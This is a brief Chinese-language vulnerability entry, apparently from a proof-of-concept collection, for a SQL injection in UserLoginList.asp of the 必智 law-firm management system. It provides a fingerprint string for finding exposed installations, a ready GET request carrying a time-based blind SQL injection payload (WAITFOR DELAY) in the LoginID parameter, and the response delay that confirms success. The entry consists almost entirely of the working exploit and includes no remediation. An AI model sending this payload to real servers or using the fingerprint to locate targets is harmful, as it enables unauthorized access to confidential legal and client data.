# 必智律师事务所综合管理系统UserLoginList.asp存在SQL注入漏洞

必智律师事务所综合管理系统UserLoginList.asp ｜ SQL注入 ｜ —
- **指纹**：`body="必智律师事务所综合信息管理系统"`
- **请求**：`GET /system/UserLoginList.asp?LoginID=40%27%20;WAITFOR%20DELAY%20%270:0:3%27%20-- HTTP/1.1`
- **响应特征**：200 响应时间>=3s